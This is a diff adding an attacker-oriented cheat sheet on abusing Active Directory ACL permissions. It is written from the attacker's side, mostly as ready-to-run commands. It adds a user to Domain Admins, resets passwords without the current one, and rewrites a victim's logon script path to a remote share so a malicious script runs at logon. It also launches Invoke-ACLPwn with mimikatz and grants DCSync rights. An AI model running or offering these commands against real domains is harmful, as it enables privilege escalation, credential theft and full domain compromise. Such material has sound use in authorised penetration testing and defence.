@@ -1,0 +1,64 @@
+# AD ACL Abuse
+# Some of the Active Directory object permissions and types that we as
+# attackers are interested in:
+# 
+# - **GenericAll** - full rights to the object (add users to a group or reset user's password);
+# - **GenericWrite** - update object's attributes (i.e logon script);
+# - **WriteOwner** - change object owner to attacker controlled user take over the object;
+# - **WriteDACL** - modify object's ACEs and give attacker full control right over the object;
+# - **AllExtendedRights** - ability to add user to a group or reset password;
+# - **ForceChangePassword** - ability to change user's password;
+# - **Self (Self-Membership)** - ability to add yourself to a group;
+
+
+# Check ACLs for user "User1"
+ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+
+
+# GenericAll on User
+# We can reset user's password without knowing the current password; 
+
+
+# GenericAll on Group
+# Effectively, this allows us to add ourselves (the user spotless) to the
+# Domain Admin group:
+net group "domain admins" spotless /add /domain;
+
+
+# WriteProperty on Group
+# We can again add ourselves to the Domain Admins group and escalate
+# privileges:
+net user spotless /domain;
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local";
+net user spotless /domain;
+
+
+# Self (Self-Membership) on Group
+# Another privilege that enables the attacker adding themselves to a group;
+
+# ForceChangePassword
+# We can reset the user's password without knowing their current password
+$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose;
+
+# GenericWrite on User
+# WriteProperty on an ObjectType, which in this
+# particular case is Script-Path, allows the attacker to overwrite the
+# logon script path of the delegate user, which means that the next time,
+# when the user delegate logs on, their system will execute our malicious
+# script:
+Set-ADObject -SamAccountName delegate -PropertyName scriptpath \
+-PropertyValue "\\10.0.0.5\totallyLegitScript.ps1;
+
+# WriteDACL
+## It is possible to add any given account as a
+## replication partner of the domain by applying the following extended
+## rights Replicating Directory Changes/Replicating Directory Changes All.
+
+## Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs
+in Active Directory that are unsafe configured:
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
+
+## Give DCSyns right to the user titi
+Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
+
+
